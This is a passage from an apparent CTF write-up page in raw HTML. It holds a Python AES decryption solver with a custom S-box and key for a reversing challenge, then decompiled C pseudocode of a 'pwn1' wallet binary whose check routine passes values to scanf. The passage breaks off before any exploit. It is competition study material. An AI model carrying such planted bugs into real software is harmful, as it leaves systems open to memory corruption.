class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">aes</span>:<br>    Round_num=<span class="hljs-number">10</span><br>    S_Box=[<span class="hljs-number">0x65</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xB6</span>]<br>    Rcon=[<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>,<br>          <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>,<br>          <span class="hljs-number">0x10</span>, <span class="hljs-number">0x20</span>,<br>          <span class="hljs-number">0x40</span>, <span class="hljs-number">0x80</span>,<br>          <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x36</span>]<br>    En_Status=[[<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],<br>               [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>],<br>               [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>               [<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]]<br>    De_Status=[[<span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x09</span>],<br>               [<span class="hljs-number">0x09</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0D</span>],<br>               [<span class="hljs-number">0x0D</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0B</span>],<br>               [<span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0E</span>]]<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,Key</span>):<br>        self.D_Box=[<span class="hljs-number">0</span>]*<span class="hljs-number">256</span><br>        <span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(self.S_Box):<br>            self.D_Box[v]=i<br>        self.Round_num=<span class="hljs-number">10</span><br>        self.Key=Key<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Rot_Word</span>(<span class="hljs-params">self,Raw_data,Rot_Num=<span class="hljs-number">1</span></span>):<br>        Raw_len=<span class="hljs-built_in">len</span>(Raw_data)<br>        New_data=[]<br>        i=Rot_Num<br>        New_len=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> New_len&lt;Raw_len:<br>            New_data.append(Raw_data[i%Raw_len])<br>            i=i+<span class="hljs-number">1</span><br>            New_len+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> New_data<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SubBytes</span>(<span class="hljs-params">self,Raw_data,Box</span>):<br>        New_data=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Raw_data:<br>            New_Row=[]<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>                New_Row.append(Box[j])<br>            New_data.append(New_Row)<br>        <span class="hljs-keyword">return</span> New_data<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">T</span>(<span class="hljs-params">self,Raw_data,Round_N</span>):<br>        New_data=self.SubBytes([self.Rot_Word(Raw_data)],self.S_Box)[<span class="hljs-number">0</span>]<br>        New_data[<span class="hljs-number">0</span>]^=self.Rcon[Round_N]<br>        <span class="hljs-keyword">return</span> New_data<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">ExtentKey</span>(<span class="hljs-params">self,Key_data : <span class="hljs-built_in">list</span></span>):<br>        Ext_Key=Key_data.copy()<br>        i=<span class="hljs-built_in">len</span>(Key_data)<br>        Step=<span class="hljs-number">4</span><br>        <span class="hljs-keyword">while</span> i&lt;self.Round_num*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>:<br>            New_k=[]<br>            <span class="hljs-keyword">if</span> i%Step != <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">for</span> j,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(Ext_Key[i-Step]):<br>                    New_k.append(Ext_Key[i-<span class="hljs-number">1</span>][j]^v)<br>            <span class="hljs-keyword">else</span>:<br>                T_Key=self.T(Ext_Key[i-<span class="hljs-number">1</span>],i//Step-<span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">for</span> j,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(Ext_Key[i-Step]):<br>                   New_k.append(T_Key[j]^v)<br>            Ext_Key.append(New_k)<br>            i+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> Ext_Key<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">ShiftRow</span>(<span class="hljs-params">self,Row_data,dire=<span class="hljs-literal">True</span></span>):<br>        New_data=[]<br>        Row_len=<span class="hljs-built_in">len</span>(Row_data)<br>        Col_len=<span class="hljs-built_in">len</span>(Row_data[<span class="hljs-number">0</span>])<br>        i=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> i&lt;Row_len:<br>            New_data.append([])<br>            j=<span class="hljs-number">0</span><br>            <span class="hljs-keyword">while</span> j&lt;Col_len:<br>                <span class="hljs-keyword">if</span> dire:<br>                    New_data[i].append(Row_data[ (j+i)%Row_len ][j])<br>                <span class="hljs-keyword">else</span>: <br>                    New_data[i].append(Row_data[ (Row_len-j+i)%Row_len ][ j ] )<br>                j+=<span class="hljs-number">1</span><br>            i+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> New_data<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Safe_Out2</span>(<span class="hljs-params">self,Raw_data</span>):<br>        Result=Raw_data<br>        Result=Result*<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> Result&gt;=<span class="hljs-number">0x100</span>:<br>            Result=(Result&amp;<span class="hljs-number">0xff</span>)^<span class="hljs-number">0x1b</span><br>        <span class="hljs-keyword">return</span> Result<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Safe_Out4</span>(<span class="hljs-params">self,Raw_data</span>):<br>        <span class="hljs-keyword">return</span> self.Safe_Out2(self.Safe_Out2(Raw_data))<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Safe_Out8</span>(<span class="hljs-params">self,Raw_data</span>):<br>        <span class="hljs-keyword">return</span> self.Safe_Out4(self.Safe_Out2(Raw_data))<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Safe_Mix</span>(<span class="hljs-params">self,Raw_data,Num</span>):<br>        Result=Raw_data<br>        <span class="hljs-keyword">if</span> Num==<span class="hljs-number">3</span>:<br>            Result=self.Safe_Out2(Result)^Raw_data<br>        <span class="hljs-keyword">elif</span> Num==<span class="hljs-number">2</span>:<br>            Result=self.Safe_Out2(Result)<br>        <span class="hljs-keyword">elif</span> Num==<span class="hljs-number">9</span>:<br>            Result=self.Safe_Out8(Result)^Raw_data<br>        <span class="hljs-keyword">elif</span> Num==<span class="hljs-number">11</span>:<br>            Result=self.Safe_Out8(Result)^self.Safe_Out2(Result)^Raw_data<br>        <span class="hljs-keyword">elif</span> Num==<span class="hljs-number">13</span>:<br>            Result=self.Safe_Out8(Result)^self.Safe_Out4(Result)^Raw_data<br>        <span class="hljs-keyword">elif</span> Num==<span class="hljs-number">14</span>:<br>            Result=self.Safe_Out8(Result)^self.Safe_Out4(Result)^self.Safe_Out2(Result)<br>        <span class="hljs-keyword">return</span> Result<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Column_Mix</span>(<span class="hljs-params">self,Row_data,Mul_Mat</span>):<br>        New_data=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Row_data:<br>            New_Row=[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">for</span> j,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(i):<br>                New_Row[<span class="hljs-number">0</span>]^=self.Safe_Mix(v,Mul_Mat[<span class="hljs-number">0</span>][j])<br>                New_Row[<span class="hljs-number">1</span>]^=self.Safe_Mix(v,Mul_Mat[<span class="hljs-number">1</span>][j])<br>                New_Row[<span class="hljs-number">2</span>]^=self.Safe_Mix(v,Mul_Mat[<span class="hljs-number">2</span>][j])<br>                New_Row[<span class="hljs-number">3</span>]^=self.Safe_Mix(v,Mul_Mat[<span class="hljs-number">3</span>][j])<br>            New_data.append(New_Row)<br>        <span class="hljs-keyword">return</span> New_data <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">xorMat</span>(<span class="hljs-params">self,Data_Mat,Key_Mat</span>):<br>        New_Mat=[]<br>        <span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(Data_Mat):<br>            New_Row=[]<br>            <span class="hljs-keyword">for</span> j,v1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(Data_Mat[i]):<br>                New_Row.append(v1^Key_Mat[i][j])<br>            New_Mat.append(New_Row)<br>        <span class="hljs-keyword">return</span> New_Mat<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">toMatrix</span>(<span class="hljs-params">self,data,Mat_W=<span class="hljs-number">4</span>,Mat_H=<span class="hljs-number">4</span></span>):<br>        Matrixs=[]<br>        w_i=<span class="hljs-number">0</span><br>        h_i=<span class="hljs-number">0</span><br>        Matrix=[]<br>        Matrix_Row=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>            Matrix_Row.append(i)<br>            w_i+=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> w_i &gt;= Mat_W:<br>                Matrix.append(Matrix_Row)<br>                Matrix_Row=[]<br>                w_i=<span class="hljs-number">0</span><br>                h_i+=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> h_i&gt;=Mat_H:<br>                Matrixs.append(Matrix)<br>                h_i=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">return</span> Matrixs<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">toList</span>(<span class="hljs-params">self,Raw_Mat</span>):<br>        Out_data=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Raw_Mat:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>                Out_data.append(j)<br>        <span class="hljs-keyword">return</span> Out_data<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self,Raw_data</span>):<br>        Key_Mat=self.toMatrix(self.Key)[<span class="hljs-number">0</span>]<br>        Exten_K=self.ExtentKey(Key_Mat)<br>        Key_Mat=Exten_K[self.Round_num*<span class="hljs-number">4</span>:self.Round_num*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>]<br>        Plain=[]<br>        This_data=<span class="hljs-number">0</span><br>        De_len=<span class="hljs-built_in">len</span>(Raw_data)<br>        <span class="hljs-keyword">while</span> This_data &lt; De_len:<br>            T_de_data=self.toMatrix(Raw_data[This_data:This_data+<span class="hljs-number">16</span>])[<span class="hljs-number">0</span>]<br>            T_de_data=self.xorMat(T_de_data,Key_Mat)<br>            This_Round=<span class="hljs-number">0</span><br>            This_Key=self.Round_num*<span class="hljs-number">4</span>-<span class="hljs-number">4</span><br>            <span class="hljs-keyword">while</span> This_Round &lt; self.Round_num:<br>                T_Key=Exten_K[This_Key:This_Key+<span class="hljs-number">4</span>]<br>                T_de_data=self.SubBytes(T_de_data,self.D_Box)<br>                T_de_data=self.ShiftRow(T_de_data,dire=<span class="hljs-literal">False</span>)<br>                <span class="hljs-keyword">if</span> This_Round!=self.Round_num-<span class="hljs-number">1</span>:<br>                    T_de_data=self.Column_Mix(T_de_data,self.De_Status)<br>                    T_Key=self.Column_Mix(T_Key,self.De_Status)<br>                T_de_data=self.xorMat(T_de_data,T_Key)<br>                This_Key-=<span class="hljs-number">4</span><br>                This_Round+=<span class="hljs-number">1</span><br>            Plain=Plain+self.toList(T_de_data)<br>            This_data+=<span class="hljs-number">16</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(Plain)<br><br>key=<span class="hljs-string">b&#x27;Th3_K4y_R3vers3!&#x27;</span><br>a=aes(key)<br>b=<span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x5A</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x3F</span>])<br><span class="hljs-built_in">print</span>(a.decrypt(b))<br></code></pre></td></tr></table></figure><h2 id="pwn">pwn</h2><h3 id="pwn1">pwn1</h3><h4 id="main伪代码">main伪代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp-10h] [ebp-20h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp-Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">int</span> v6[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [esp+0h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">int</span> *p_argc; <span class="hljs-comment">// [esp+8h] [ebp-8h]</span><br><br>  p_argc = &amp;argc;<br>  v6[<span class="hljs-number">1</span>] = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  setbufs();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wal1et prepares a big wallet for you, but clever man always has double passwords. So make your choice.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.JUST OPEN IT!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.EXIT&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, v6, v4, v5);<br>  <span class="hljs-keyword">if</span> ( v6[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span> )<br>  &#123;<br>    begin(p_argc);<br>    check();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Here is something you like.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="begin伪代码">begin伪代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">begin</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp-8h] [ebp-80h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp-4h] [ebp-7Ch]</span><br>  <span class="hljs-type">char</span> v3[<span class="hljs-number">108</span>]; <span class="hljs-comment">// [esp+0h] [ebp-78h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v4 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Show me your name : &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%108s&quot;</span>, v3, v1, v2);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome %s! :P\n&quot;</span>, v3);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="check伪代码">check伪代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">check</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp-8h] [ebp-20h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp-8h] [ebp-20h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp-4h] [ebp-1Ch]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp-4h] [ebp-1Ch]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+8h] [ebp-10h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now try the First password : &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, v5, v1, v3);<br>  fflush(<span class="hljs-built_in">stdin</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now try the Second password : &quot;</span>);<br>  